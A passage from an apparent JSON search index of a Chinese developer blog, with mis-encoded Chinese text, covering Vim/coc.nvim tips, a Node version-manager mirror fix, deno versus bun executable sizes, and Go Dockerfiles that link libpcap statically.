targetsæ˜¯æ–‡ä»¶åï¼Œå¯ä»¥ç”¨ç©ºæ ¼åˆ†å¼€å¤šä¸ªæ–‡ä»¶åï¼Œä¸€èˆ¬æƒ…å†µä¸‹ï¼Œåªæœ‰ä¸€ä¸ª commandæ˜¯ä¸€ç³»åˆ—çš„æŒ‡ä»¤ï¼Œå¯ä»¥å¤šè¡Œåˆ†å¼€ prerequisitesæ˜¯ä¾èµ–é¡¹ç›®ï¼Œå¯ä»¥ç”¨ç©ºæ ¼åˆ†å¼€å¤šä¸ª å‚è€ƒ https://makefiletutorial.com/#makefile-cookbook ","title":"Tutorial"},{"content":"è¯·æ³¨æ„ï¼ŒVIMçš„å…‰æ ‡ç°åœ¨ä½äºé”™è¯¯å¼¹çª—ä¸Šäº†ã€‚å…‰æ ‡åªèƒ½å·¦å³ç§»åŠ¨ï¼Œæ— æ³•ä¸Šçº¿ç§»åŠ¨ã€‚ æˆ‘çš„å…‰æ ‡è¢«å›°åœ¨äº†é”™è¯¯æç¤ºæ¡†ä¸­ã€‚\nå› ä¸ºé”™è¯¯æç¤ºåªæœ‰ä¸€è¡Œï¼Œæ‰€ä»¥æ— æ³•ä¸Šä¸‹ç§»åŠ¨ã€‚\nä¸€ç›´ä»¥æ¥ï¼Œæˆ‘å¹¶æ²¡æœ‰æŠŠé”™è¯¯æç¤ºæ¡†ä¹Ÿçœ‹æˆä¸€ä¸ªçª—å£ï¼Œæ‰€ä»¥æˆ‘å¯èƒ½å¤šæ¬¡æŒ‰äº†ctrl + w w, ç„¶åå…‰æ ‡è·³è½¬åˆ°äº†é”™è¯¯æç¤ºæ¡†ä¸Šã€‚\næ­£å¸¸çš„é”™è¯¯æç¤ºæ¡†ï¼Œå½“å…‰æ ‡ä¸åœ¨å…³é”®è¯ä¸Šæ—¶ï¼Œé”™è¯¯å¼¹çª—ä¼šè‡ªåŠ¨å…³é—­çš„ã€‚ ä½†æ˜¯ç”±äºæˆ‘å·²ç»è¿›å…¥äº†é”™è¯¯å¼¹çª—é‡Œé¢ã€‚ æ‰€ä»¥é™¤éæŒ‰çª—å£åˆ‡æ¢çš„å¿«æ·é”®ï¼Œæˆ‘ä¼šå§‹ç»ˆå›°åœ¨è¿™ä¸ªé”™è¯¯çª—å£ä¸­ã€‚\næˆ‘è§‰å¾—ï¼ŒVIMå®åœ¨æ˜¯å¤ªåšå¤§ç²¾æ·±äº†ã€‚å¾ˆå¤šæ¦‚å¿µæ€§çš„ç†è§£ä¸åˆ°ä½ï¼Œå°±ä¼šè¶Šåˆ°å¾ˆå¤šå›°éš¾ã€‚ è¿™äº›å›°éš¾ä¼šç»™äººé€ æˆæå¤§çš„æŒ«æŠ˜æ„Ÿã€‚\nèƒ½è§£å†³å›°éš¾ï¼Œåˆ™å­¦åˆ°ä¸œè¥¿ã€‚\nå¦åˆ™å°±åªèƒ½æ”¾å¼ƒVIM, å›åˆ°VScodeçš„æ€€æŠ±ä¸­ã€‚\nä½†æ˜¯ï¼Œæˆ‘å·²ç»ä¹ æƒ¯äº†ä¸ä½¿ç”¨é¼ æ ‡çš„å¿«æ·ç¼–è¾‘æ–¹å¼ã€‚\næˆ‘åªèƒ½å­¦ä¼šè§£å†³å¹¶é€‚åº”VIMï¼Œ å¹¶ä¸”æ¥å—VIMçš„æ‰€æœ‰æŒ‘æˆ˜ã€‚\n","permalink":"https://wdd.js.org/vim/stuck-in-error-msgfloat-window/","summary":"è¯·æ³¨æ„ï¼ŒVIMçš„å…‰æ ‡ç°åœ¨ä½äºé”™è¯¯å¼¹çª—ä¸Šäº†ã€‚å…‰æ ‡åªèƒ½å·¦å³ç§»åŠ¨ï¼Œæ— æ³•ä¸Šçº¿ç§»åŠ¨ã€‚ æˆ‘çš„å…‰æ ‡è¢«å›°åœ¨äº†é”™è¯¯æç¤ºæ¡†ä¸­ã€‚\nå› ä¸ºé”™è¯¯æç¤ºåªæœ‰ä¸€è¡Œï¼Œæ‰€ä»¥æ— æ³•ä¸Šä¸‹ç§»åŠ¨ã€‚\nä¸€ç›´ä»¥æ¥ï¼Œæˆ‘å¹¶æ²¡æœ‰æŠŠé”™è¯¯æç¤ºæ¡†ä¹Ÿçœ‹æˆä¸€ä¸ªçª—å£ï¼Œæ‰€ä»¥æˆ‘å¯èƒ½å¤šæ¬¡æŒ‰äº†ctrl + w w, ç„¶åå…‰æ ‡è·³è½¬åˆ°äº†é”™è¯¯æç¤ºæ¡†ä¸Šã€‚\næ­£å¸¸çš„é”™è¯¯æç¤ºæ¡†ï¼Œå½“å…‰æ ‡ä¸åœ¨å…³é”®è¯ä¸Šæ—¶ï¼Œé”™è¯¯å¼¹çª—ä¼šè‡ªåŠ¨å…³é—­çš„ã€‚ ä½†æ˜¯ç”±äºæˆ‘å·²ç»è¿›å…¥äº†é”™è¯¯å¼¹çª—é‡Œé¢ã€‚ æ‰€ä»¥é™¤éæŒ‰çª—å£åˆ‡æ¢çš„å¿«æ·é”®ï¼Œæˆ‘ä¼šå§‹ç»ˆå›°åœ¨è¿™ä¸ªé”™è¯¯çª—å£ä¸­ã€‚\næˆ‘è§‰å¾—ï¼ŒVIMå®åœ¨æ˜¯å¤ªåšå¤§ç²¾æ·±äº†ã€‚å¾ˆå¤šæ¦‚å¿µæ€§çš„ç†è§£ä¸åˆ°ä½ï¼Œå°±ä¼šè¶Šåˆ°å¾ˆå¤šå›°éš¾ã€‚ è¿™äº›å›°éš¾ä¼šç»™äººé€ æˆæå¤§çš„æŒ«æŠ˜æ„Ÿã€‚\nèƒ½è§£å†³å›°éš¾ï¼Œåˆ™å­¦åˆ°ä¸œè¥¿ã€‚\nå¦åˆ™å°±åªèƒ½æ”¾å¼ƒVIM, å›åˆ°VScodeçš„æ€€æŠ±ä¸­ã€‚\nä½†æ˜¯ï¼Œæˆ‘å·²ç»ä¹ æƒ¯äº†ä¸ä½¿ç”¨é¼ æ ‡çš„å¿«æ·ç¼–è¾‘æ–¹å¼ã€‚\næˆ‘åªèƒ½å­¦ä¼šè§£å†³å¹¶é€‚åº”VIMï¼Œ å¹¶ä¸”æ¥å—VIMçš„æ‰€æœ‰æŒ‘æˆ˜ã€‚","title":"å›°åœ¨cocé”™è¯¯å¼¹çª—ä¸­"},{"content":"åœ¨VScodeä¸­ï¼Œå¯ä»¥ä½¿ç”¨å³é”®æ¥è·³è½¬åˆ°typescriptç±»å‹å¯¹åº”çš„å®šä¹‰ï¼Œä½†æ˜¯ç”¨vimçš„gdå‘½ä»¤å´æ— æ³•æ­£å¸¸è·³è½¬ã€‚\nå› ä¸ºæ— æ³•æ­£å¸¸è·³è½¬çš„è¿™ä¸ªé—®é¢˜ï¼Œæˆ‘å·®ç‚¹æ”¾å¼ƒäº†vimã€‚\nç„¶è€Œæˆ‘æƒ³åˆ«äººåº”è¯¥ä¹Ÿé‡åˆ°ç±»ä¼¼çš„é—®é¢˜ã€‚\næˆ‘çš„neovimæœ¬èº«ä½¿ç”¨çš„æ˜¯cocæ’ä»¶ï¼Œç„¶åæˆ‘å°±å†æ¬¡åˆ°çœ‹çœ‹å®˜æ–¹æ–‡æ¡£ï¼Œæ¥ç¡®å®šæœ€ç»ˆæœ‰æ²¡æœ‰è§£å†³è¿™ä¸ªé—®é¢˜çš„æ–¹æ¡ˆã€‚\nåŠŸå¤«ä¸è´Ÿæœ‰å¿ƒäººã€‚\næˆ‘å‘ç°å®˜æ–¹ç»™çš„ä¾‹å­ä¸­ï¼Œå°±åŒ…æ‹¬äº†å¦‚ä½•é…ç½®è·³æ¢çš„é…ç½®ã€‚\né¦–å…ˆè¯´æ˜ä¸€ä¸‹ï¼Œæˆ‘æœ¬èº«å°±å®‰è£…äº†coc-json coc-tsserverè¿™ä¸¤ä¸ªæ’ä»¶ï¼Œæ‰€ä»¥åªéœ€è¦å°†å¦‚ä¸‹çš„é…ç½®å†™å…¥init.vim\n\u0026#34; GoTo code navigation nmap \u0026lt;silent\u0026gt; gd \u0026lt;Plug\u0026gt;(coc-definition) nmap \u0026lt;silent\u0026gt; gy \u0026lt;Plug\u0026gt;(coc-type-definition) nmap \u0026lt;silent\u0026gt; gi \u0026lt;Plug\u0026gt;(coc-implementation) nmap \u0026lt;silent\u0026gt; gr \u0026lt;Plug\u0026gt;(coc-references) è¿™æ ·çš„è¯ï¼Œåœ¨æ™®é€šæ¨¡å¼ï¼ŒæŒ‰gyè¿™ä¸ªå¿«æ·é”®ï¼Œå°±èƒ½è·³è½¬åˆ°å¯¹åº”çš„ç±»å‹å®šä¹‰ï¼ŒåŒ…æ‹¬æŸä¸ªnpmåŒ…çš„é‡Œé¢çš„ç±»å‹å®šä¹‰ï¼Œéå¸¸å¥½ç”¨ã€‚\näº²æµ‹æœ‰æ•ˆã€‚\n","permalink":"https://wdd.js.org/vim/typescript-go-to-definition/","summary":"åœ¨VScodeä¸­ï¼Œå¯ä»¥ä½¿ç”¨å³é”®æ¥è·³è½¬åˆ°typescriptç±»å‹å¯¹åº”çš„å®šä¹‰ï¼Œä½†æ˜¯ç”¨vimçš„gdå‘½ä»¤å´æ— æ³•æ­£å¸¸è·³è½¬ã€‚\nå› ä¸ºæ— æ³•æ­£å¸¸è·³è½¬çš„è¿™ä¸ªé—®é¢˜ï¼Œæˆ‘å·®ç‚¹æ”¾å¼ƒäº†vimã€‚\nç„¶è€Œæˆ‘æƒ³åˆ«äººåº”è¯¥ä¹Ÿé‡åˆ°ç±»ä¼¼çš„é—®é¢˜ã€‚\næˆ‘çš„neovimæœ¬èº«ä½¿ç”¨çš„æ˜¯cocæ’ä»¶ï¼Œç„¶åæˆ‘å°±å†æ¬¡åˆ°çœ‹çœ‹å®˜æ–¹æ–‡æ¡£ï¼Œæ¥ç¡®å®šæœ€ç»ˆæœ‰æ²¡æœ‰è§£å†³è¿™ä¸ªé—®é¢˜çš„æ–¹æ¡ˆã€‚\nåŠŸå¤«ä¸è´Ÿæœ‰å¿ƒäººã€‚\næˆ‘å‘ç°å®˜æ–¹ç»™çš„ä¾‹å­ä¸­ï¼Œå°±åŒ…æ‹¬äº†å¦‚ä½•é…ç½®è·³æ¢çš„é…ç½®ã€‚\né¦–å…ˆè¯´æ˜ä¸€ä¸‹ï¼Œæˆ‘æœ¬èº«å°±å®‰è£…äº†coc-json coc-tsserverè¿™ä¸¤ä¸ªæ’ä»¶ï¼Œæ‰€ä»¥åªéœ€è¦å°†å¦‚ä¸‹çš„é…ç½®å†™å…¥init.vim\n\u0026#34; GoTo code navigation nmap \u0026lt;silent\u0026gt; gd \u0026lt;Plug\u0026gt;(coc-definition) nmap \u0026lt;silent\u0026gt; gy \u0026lt;Plug\u0026gt;(coc-type-definition) nmap \u0026lt;silent\u0026gt; gi \u0026lt;Plug\u0026gt;(coc-implementation) nmap \u0026lt;silent\u0026gt; gr \u0026lt;Plug\u0026gt;(coc-references) è¿™æ ·çš„è¯ï¼Œåœ¨æ™®é€šæ¨¡å¼ï¼ŒæŒ‰gyè¿™ä¸ªå¿«æ·é”®ï¼Œå°±èƒ½è·³è½¬åˆ°å¯¹åº”çš„ç±»å‹å®šä¹‰ï¼ŒåŒ…æ‹¬æŸä¸ªnpmåŒ…çš„é‡Œé¢çš„ç±»å‹å®šä¹‰ï¼Œéå¸¸å¥½ç”¨ã€‚\näº²æµ‹æœ‰æ•ˆã€‚","title":"VIM typescript è·³è½¬åˆ°å®šä¹‰"},{"content":"æˆ‘ä¸€èˆ¬ä¼šç´§è·Ÿç€NodeJSå®˜ç½‘çš„æœ€æ–°ç‰ˆï¼Œæ¥æ›´æ–°æœ¬åœ°çš„NodeJSç‰ˆæœ¬ã€‚\næˆ‘çš„ç³»ç»Ÿæ˜¯ubuntu 20.4, æˆ‘ç”¨tj/nè¿™ä¸ªå·¥å…·æ¥æ›´æ–°Nodeã€‚\nä½†æ˜¯è¿™ä¸€æ¬¡ï¼Œè¿™ä¸ªå‘½ä»¤ä¼¼ä¹å¡ä½äº†ã€‚\næˆ‘æ’æŸ¥åå‘ç°ï¼Œæ˜¯nè¿™ä¸ªå‘½ä»¤åœ¨è®¿é—®https://nodejs.org/dist/index.tabè¿™ä¸ªåœ°å€æ—¶ï¼Œå¡ä½äº†ã€‚\nè¯·æ±‚è¶…æ—¶ï¼Œå› ä¸ºé»˜è®¤æ²¡æœ‰è®¾ç½®è¶…æ—¶æ—¶é•¿ï¼Œæ‰€ä»¥ç­‰å¾…äº†å¾ˆä¹…æ‰æ˜¾ç¤ºè¶…æ—¶çš„æŠ¥é”™ï¼Œè¡¨ç°è±¡ä¸Šçœ‹èµ·æ¥å°±æ˜¯å¡ä½äº†ã€‚\né¦–å…ˆæˆ‘ç”¨digå‘½ä»¤æŸ¥äº†nodejs.orgçš„dnsè§£æï¼Œæˆ‘å‘ç°æ˜¯æ­£å¸¸è§£æçš„ã€‚\nç„¶åæˆ‘åˆç”¨curlå¯¹nodejså®˜ç½‘åšäº†ä¸€ä¸ªæµ‹è¯•ï¼Œå‘ç°ä¹Ÿæ˜¯è¯·æ±‚è¶…æ—¶ã€‚\ncurl -i -m 5 https://nodejs.org curl: (28) Failed to connect to nodejs.org port 443 after 3854 ms: è¿æ¥è¶…æ—¶ è¿™æ ·é—®é¢˜å°±æ¸…æ¥šäº†ï¼Œç„¶åæˆ‘å°±æƒ³èµ·æ¥npmirrrorä¸Šåº”è¯¥æœ‰nodejsçš„é•œåƒã€‚ åœ¨æŸ¥çœ‹nè¿™ä¸ªå·¥å…·çš„æ–‡æ¡£æ—¶ï¼Œæˆ‘ä¹Ÿå‘ç°ï¼Œå®ƒæ˜¯æ”¯æŒè®¾ç½®mirrorçš„ã€‚\nå…¶ä¸­ç»™çš„ä¾‹å­ç”¨çš„å°±æ˜¯æ·˜å®NPM\nå°±æ˜¯è®¾ç½®äº†ä¸€ä¸ªç¯å¢ƒå˜é‡ã€‚ç„¶åæ‰§è¡Œsource ~/.zshrc\nexport N_NODE_MIRROR=https://npmmirror.com/mirrors/node ä½†æ˜¯ï¼Œæˆ‘å‘ç°åœ¨å‘½ä»¤è¡Œé‡Œç”¨echoå¯ä»¥æ‰“å°N_NODE_MIRRORè¿™ä¸ªå˜é‡çš„å€¼ï¼Œä½†æ˜¯åœ¨å®‰è£…è„šæœ¬é‡Œï¼Œè¿˜æ˜¯æ— æ³•è·å–è®¾ç½®çš„è¿™ä¸ªmirrorã€‚\næˆ‘æƒ³æˆ–è®¸å’Œæˆ‘åœ¨æ‰§è¡Œsudo n ltsæ—¶çš„sudoæœ‰å…³ï¼Œè¿™ä¸ª.zshrcåœ¨sudoè¿™ç§ç®¡ç†å‘˜æ¨¡å¼ä¸‹æ˜¯ä¸ç”Ÿæ•ˆçš„ã€‚æ™®é€šç”¨æˆ·çš„ç¯å¢ƒå˜é‡ä¹Ÿä¸ä¼šç»§æ‰¿åˆ°sudoæ‰§è¡Œçš„ç¯å¢ƒå˜é‡é‡Œ\næœ€åï¼Œæˆ‘ç”¨sudo -E n lts, æˆåŠŸçš„ä»npmmirrorä¸Šæ›´æ–°äº†nodejsçš„ç‰ˆæœ¬ã€‚\nå…³äºcurlè¶…æ—¶çš„è¿™ä¸ªé—®é¢˜ï¼Œæˆ‘ä¹Ÿç»™nä»“åº“æå‡ºäº†pull request, https://github.com/tj/n/pull/771\n","permalink":"https://wdd.js.org/posts/2023/n-stucked/","summary":"æˆ‘ä¸€èˆ¬ä¼šç´§è·Ÿç€NodeJSå®˜ç½‘çš„æœ€æ–°ç‰ˆï¼Œæ¥æ›´æ–°æœ¬åœ°çš„NodeJSç‰ˆæœ¬ã€‚\næˆ‘çš„ç³»ç»Ÿæ˜¯ubuntu 20.4, æˆ‘ç”¨tj/nè¿™ä¸ªå·¥å…·æ¥æ›´æ–°Nodeã€‚\nä½†æ˜¯è¿™ä¸€æ¬¡ï¼Œè¿™ä¸ªå‘½ä»¤ä¼¼ä¹å¡ä½äº†ã€‚\næˆ‘æ’æŸ¥åå‘ç°ï¼Œæ˜¯nè¿™ä¸ªå‘½ä»¤åœ¨è®¿é—®https://nodejs.org/dist/index.tabè¿™ä¸ªåœ°å€æ—¶ï¼Œå¡ä½äº†ã€‚\nè¯·æ±‚è¶…æ—¶ï¼Œå› ä¸ºé»˜è®¤æ²¡æœ‰è®¾ç½®è¶…æ—¶æ—¶é•¿ï¼Œæ‰€ä»¥ç­‰å¾…äº†å¾ˆä¹…æ‰æ˜¾ç¤ºè¶…æ—¶çš„æŠ¥é”™ï¼Œè¡¨ç°è±¡ä¸Šçœ‹èµ·æ¥å°±æ˜¯å¡ä½äº†ã€‚\né¦–å…ˆæˆ‘ç”¨digå‘½ä»¤æŸ¥äº†nodejs.orgçš„dnsè§£æï¼Œæˆ‘å‘ç°æ˜¯æ­£å¸¸è§£æçš„ã€‚\nç„¶åæˆ‘åˆç”¨curlå¯¹nodejså®˜ç½‘åšäº†ä¸€ä¸ªæµ‹è¯•ï¼Œå‘ç°ä¹Ÿæ˜¯è¯·æ±‚è¶…æ—¶ã€‚\ncurl -i -m 5 https://nodejs.org curl: (28) Failed to connect to nodejs.org port 443 after 3854 ms: è¿æ¥è¶…æ—¶ è¿™æ ·é—®é¢˜å°±æ¸…æ¥šäº†ï¼Œç„¶åæˆ‘å°±æƒ³èµ·æ¥npmirrrorä¸Šåº”è¯¥æœ‰nodejsçš„é•œåƒã€‚ åœ¨æŸ¥çœ‹nè¿™ä¸ªå·¥å…·çš„æ–‡æ¡£æ—¶ï¼Œæˆ‘ä¹Ÿå‘ç°ï¼Œå®ƒæ˜¯æ”¯æŒè®¾ç½®mirrorçš„ã€‚\nå…¶ä¸­ç»™çš„ä¾‹å­ç”¨çš„å°±æ˜¯æ·˜å®NPM\nå°±æ˜¯è®¾ç½®äº†ä¸€ä¸ªç¯å¢ƒå˜é‡ã€‚ç„¶åæ‰§è¡Œsource ~/.zshrc\nexport N_NODE_MIRROR=https://npmmirror.com/mirrors/node ä½†æ˜¯ï¼Œæˆ‘å‘ç°åœ¨å‘½ä»¤è¡Œé‡Œç”¨echoå¯ä»¥æ‰“å°N_NODE_MIRRORè¿™ä¸ªå˜é‡çš„å€¼ï¼Œä½†æ˜¯åœ¨å®‰è£…è„šæœ¬é‡Œï¼Œè¿˜æ˜¯æ— æ³•è·å–è®¾ç½®çš„è¿™ä¸ªmirrorã€‚\næˆ‘æƒ³æˆ–è®¸å’Œæˆ‘åœ¨æ‰§è¡Œsudo n ltsæ—¶çš„sudoæœ‰å…³ï¼Œè¿™ä¸ª.zshrcåœ¨sudoè¿™ç§ç®¡ç†å‘˜æ¨¡å¼ä¸‹æ˜¯ä¸ç”Ÿæ•ˆçš„ã€‚æ™®é€šç”¨æˆ·çš„ç¯å¢ƒå˜é‡ä¹Ÿä¸ä¼šç»§æ‰¿åˆ°sudoæ‰§è¡Œçš„ç¯å¢ƒå˜é‡é‡Œ\næœ€åï¼Œæˆ‘ç”¨sudo -E n lts, æˆåŠŸçš„ä»npmmirrorä¸Šæ›´æ–°äº†nodejsçš„ç‰ˆæœ¬ã€‚\nå…³äºcurlè¶…æ—¶çš„è¿™ä¸ªé—®é¢˜ï¼Œæˆ‘ä¹Ÿç»™nä»“åº“æå‡ºäº†pull request, https://github.com/tj/n/pull/771","title":"å®‰è£…NodeJS, Nå‘½ä»¤ä¼¼ä¹å¡ä½äº†"},{"content":"å¾ˆæ—©ä»¥å‰ï¼Œè¦è¿è¡Œjsï¼Œåˆ™å¿…é¡»å®‰è£…nodejsï¼Œä¸”æ²¡ä»€ä¹ˆåŠæ³•å¯ä»¥æŠŠjsç›´æ¥æ„å»ºæˆä¸€ä¸ªå¯æ‰§è¡Œçš„æ–‡ä»¶ã€‚\nåæ¥å‡ºç°ä¸€ä¸ªpkgçš„npmåŒ…ï¼Œå¯ä»¥ç”¨æ¥å°†jsæ‰“åŒ…æˆå¯æ‰§è¡Œçš„æ–‡ä»¶ã€‚\næˆ‘å¥½åƒç”¨è¿‡è¿™ä¸ªåŒ…ï¼Œä½†æ˜¯ä¼¼ä¹ä¸­é—´å‡ºè¿‡ä¸€äº›é—®é¢˜ã€‚\nç°åœ¨æ˜¯2023å¹´ï¼Œå‰ç«¯æœ‰äº†æ–°çš„æ°”è±¡ã€‚\né™¤äº†nodejså¤–ï¼Œè¿˜æœ‰å…¶ä»–çš„åæ¥æ–°ç§€ï¼Œå¦‚denoï¼Œ è¿˜æœ‰æœ€è¿‘è¡¨ç«çš„bun\nå¦å¤–nodejsæœ¬èº«ä¹Ÿå¼€å§‹æ”¯æŒæ‰“åŒ…ç‹¬ç«‹äºŒè¿›åˆ¶æ–‡ä»¶äº†ï¼Œä½†æ˜¯éœ€è¦æœ€æ–°çš„20.xç‰ˆæœ¬ï¼Œè€Œä¸”æˆ‘çœ‹äº†å®ƒçš„ä½¿ç”¨ä»‹ç»æ–‡æ¡£ï¼Œsingle-executable-applications, çœ‹èµ·æ¥æ˜¯æœ‰æœ‰ç‚¹å¤æ‚ï¼Œå…‰ä¸€ä¸ªæ„å»ºå°±å†™äº†ä¸ƒå…«æ­¥ã€‚\næ‰€ä»¥ä»Šå¤©åªæ¯”è¾ƒä¸€äº›denoå’Œbunçš„æ„å»ºå‡ºçš„æ–‡ä»¶å¤§å°ã€‚\nå‡†å¤‡çš„jsæ–‡ä»¶å†…å®¹\n// app.js console.log(\u0026#34;hello world\u0026#34;) denoæ„å»ºæŒ‡ä»¤: deno compile --output h1 app.js, æ„å»ºäº§ç‰©ä¸ºh1 bunæ„å»ºæŒ‡ä»¤: bun build ./app.js --compile --outfile h2, æ„å»ºäº§ç‰©ä¸ºh2\n-rw-r--r--@ 1 wangduanduan staff 26B Jun 1 13:34 app.js -rwxrwxrwx@ 1 wangduanduan staff 78M Jun 1 13:59 h1 -rwxrwxrwx@ 1 wangduanduan staff 45M Jun 1 14:01 h2 æºä»£ç ä¸º26bå­—èŠ‚\ndenoæ„å»ºç›¸æ¯”äºæºç çš„å€æ•°: 3152838 bunæ„å»ºç›¸æ¯”äºæºç çš„ç¿»å€: 1804415 denoæ„å»ºçš„å¯æ‰§è¡Œæ–‡ä»¶ç›¸æ¯”bunç¿»å€ï¼š1.7 å‚è€ƒ https://bun.sh/docs/bundler/executables https://deno.com/manual@v1.34.1/tools/compiler https://nodejs.org/api/single-executable-applications.html ","permalink":"https://wdd.js.org/posts/2023/js-runtime-build-executable/","summary":"å¾ˆæ—©ä»¥å‰ï¼Œè¦è¿è¡Œjsï¼Œåˆ™å¿…é¡»å®‰è£…nodejsï¼Œä¸”æ²¡ä»€ä¹ˆåŠæ³•å¯ä»¥æŠŠjsç›´æ¥æ„å»ºæˆä¸€ä¸ªå¯æ‰§è¡Œçš„æ–‡ä»¶ã€‚\nåæ¥å‡ºç°ä¸€ä¸ªpkgçš„npmåŒ…ï¼Œå¯ä»¥ç”¨æ¥å°†jsæ‰“åŒ…æˆå¯æ‰§è¡Œçš„æ–‡ä»¶ã€‚\næˆ‘å¥½åƒç”¨è¿‡è¿™ä¸ªåŒ…ï¼Œä½†æ˜¯ä¼¼ä¹ä¸­é—´å‡ºè¿‡ä¸€äº›é—®é¢˜ã€‚\nç°åœ¨æ˜¯2023å¹´ï¼Œå‰ç«¯æœ‰äº†æ–°çš„æ°”è±¡ã€‚\né™¤äº†nodejså¤–ï¼Œè¿˜æœ‰å…¶ä»–çš„åæ¥æ–°ç§€ï¼Œå¦‚denoï¼Œ è¿˜æœ‰æœ€è¿‘è¡¨ç«çš„bun\nå¦å¤–nodejsæœ¬èº«ä¹Ÿå¼€å§‹æ”¯æŒæ‰“åŒ…ç‹¬ç«‹äºŒè¿›åˆ¶æ–‡ä»¶äº†ï¼Œä½†æ˜¯éœ€è¦æœ€æ–°çš„20.xç‰ˆæœ¬ï¼Œè€Œä¸”æˆ‘çœ‹äº†å®ƒçš„ä½¿ç”¨ä»‹ç»æ–‡æ¡£ï¼Œsingle-executable-applications, çœ‹èµ·æ¥æ˜¯æœ‰æœ‰ç‚¹å¤æ‚ï¼Œå…‰ä¸€ä¸ªæ„å»ºå°±å†™äº†ä¸ƒå…«æ­¥ã€‚\næ‰€ä»¥ä»Šå¤©åªæ¯”è¾ƒä¸€äº›denoå’Œbunçš„æ„å»ºå‡ºçš„æ–‡ä»¶å¤§å°ã€‚\nå‡†å¤‡çš„jsæ–‡ä»¶å†…å®¹\n// app.js console.log(\u0026#34;hello world\u0026#34;) denoæ„å»ºæŒ‡ä»¤: deno compile --output h1 app.js, æ„å»ºäº§ç‰©ä¸ºh1 bunæ„å»ºæŒ‡ä»¤: bun build ./app.js --compile --outfile h2, æ„å»ºäº§ç‰©ä¸ºh2\n-rw-r--r--@ 1 wangduanduan staff 26B Jun 1 13:34 app.js -rwxrwxrwx@ 1 wangduanduan staff 78M Jun 1 13:59 h1 -rwxrwxrwx@ 1 wangduanduan staff 45M Jun 1 14:01 h2 æºä»£ç ä¸º26bå­—èŠ‚\ndenoæ„å»ºç›¸æ¯”äºæºç çš„å€æ•°: 3152838 bunæ„å»ºç›¸æ¯”äºæºç çš„ç¿»å€: 1804415 denoæ„å»ºçš„å¯æ‰§è¡Œæ–‡ä»¶ç›¸æ¯”bunç¿»å€ï¼š1.7 å‚è€ƒ https://bun.sh/docs/bundler/executables https://deno.com/manual@v1.34.1/tools/compiler https://nodejs.org/api/single-executable-applications.html ","title":"JSè¿è¡Œæ—¶æ„å»ºç‹¬ç«‹äºŒè¿›åˆ¶ç¨‹åºæ¯”è¾ƒ"},{"content":"å¸¸è§„æ„å»º ä¸€èˆ¬æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬çš„Dockerfileå¯èƒ½æ˜¯ä¸‹é¢è¿™æ ·çš„\nè¿™ä¸ªDockerfileä½¿ç”¨äº†å¤šæ­¥æ„å»ºï¼Œä½¿ç”¨golang:1.19.4ä½œä¸ºæ„å»ºå®¹å™¨ï¼ŒäºŒè¿›åˆ¶æ–‡ä»¶æ„å»ºæˆåŠŸåï¼Œå•ç‹¬æŠŠæ–‡ä»¶å¤åˆ¶åˆ°alpineé•œåƒã€‚ è¿™æ ·åšçš„å¥½å¤„æ˜¯æœ€åäº§å‡ºçš„é•œåƒéå¸¸å°ï¼Œä¸€èˆ¬åªæœ‰åå‡ MBçš„æ ·å­ï¼Œå¦‚æœç›´æ¥ä½¿ç”¨golangçš„é•œåƒæ¥æ„å»ºï¼Œé•œåƒä½“ç§¯å°±å¯èƒ½è¾¾åˆ°1Gå·¦å³ã€‚ FROM golang:1.19.4 as builder ENV GO111MODULE=on GOPROXY=https://goproxy.cn,direct WORKDIR /app COPY . . RUN CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build -o run . FROM alpine:3.14.2 WORKDIR /app COPY encdec run.sh /app/ COPY --from=builder /app/run . EXPOSE 3000 ENTRYPOINT [\u0026#34;/app/run\u0026#34;] ä¾èµ–libpcapçš„æ„å»º å¦‚æœä½¿ç”¨äº†ç¨‹åºä½¿ç”¨äº†libpcap æ¥æŠ“åŒ…ï¼Œé‚£ä¹ˆé™¤äº†æˆ‘ä»¬è‡ªå·±ä»£ç äº§ç”Ÿçš„äºŒè¿›åˆ¶æ–‡ä»¶å¤–ï¼Œå¯èƒ½è¿˜ä¼šä¾èµ–libpcapçš„æ–‡ä»¶ã€‚å¸¸è§„æ‰“åŒ…å°±ä¼šæŠ¥å„ç§é”™è¯¯ï¼Œä¾‹å¦‚æ–‡ä»¶æ‰¾ä¸åˆ°ï¼Œç¼ºå°‘soæ–‡ä»¶ç­‰ç­‰ã€‚\nlibpcapæ˜¯ä¸€ä¸ªcåº“ï¼Œå¹¶ä¸æ˜¯golangçš„ä»£ç ï¼Œæ‰€ä»¥å¤„ç†èµ·æ¥è¦ä¸ä¸€æ ·ã€‚\nä¸‹é¢ç›´æ¥ç»™å‡ºDockerfile\n# æ„å»ºçš„åŸºç¡€é•œåƒæ¢æˆäº†alpineé•œåƒ FROM golang:alpine as builder # å°†alpineé•œåƒæ¢æ¸…åæºï¼Œè¿™æ ·åç»­ä¾èµ–çš„å®‰è£…ä¼šåŠ å¿« RUN sed -i \u0026#39;s/dl-cdn.alpinelinux.org/mirrors.tuna.tsinghua.edu.cn/g\u0026#39; /etc/apk/repositories # å®‰è£…éœ€è¦ç”¨åˆ°çš„Cåº“ï¼Œå’Œæ„å»ºä¾èµ– RUN apk --update add linux-headers musl-dev gcc libpcap-dev # ä½¿ç”¨å›½å†…çš„goproxy ENV GO111MODULE=on GOPROXY=https://goproxy.cn,direct # è®¾ç½®å·¥ä½œç›®å½• WORKDIR /app # æ‹·è´goç›¸å…³çš„ä¾èµ– COPY go.mod go.sum ./ # ä¸‹è½½goç›¸å…³çš„ä¾èµ– RUN go mod download # å¤åˆ¶goä»£ç  COPY . . # ç¼–è¯‘goä»£ç  RUN CGO_ENABLED=1 GOOS=linux GOARCH=amd64 go build -a --ldflags \u0026#39;-linkmode external -extldflags \u0026#34;-static -s -w\u0026#34;\u0026#39; -o run main.go # ä½¿ç”¨æœ€å°çš„scratché•œåƒ FROM scratch # è®¾ç½®å·¥ä½œç›®å½• WORKDIR /app # æ‹·è´äºŒè¿›åˆ¶æ–‡ä»¶ COPY --from=builder /app/run . EXPOSE 8086 ENTRYPOINT [\u0026#34;/app/run\u0026#34;] æ•´ä¸ªDockerfileæ¯”è¾ƒå¥½ç†è§£ï¼Œé‡è¦çš„éƒ¨åˆ†å°±æ˜¯ldflagsçš„å‚æ•°äº†ï¼Œä¸‹é¢ç€é‡è®²è§£ä¸€ä¸‹\n--ldflags \u0026#39;-linkmode external -extldflags \u0026#34;-static -s -w\u0026#34;\u0026#39; è¿™ä¸ª go build 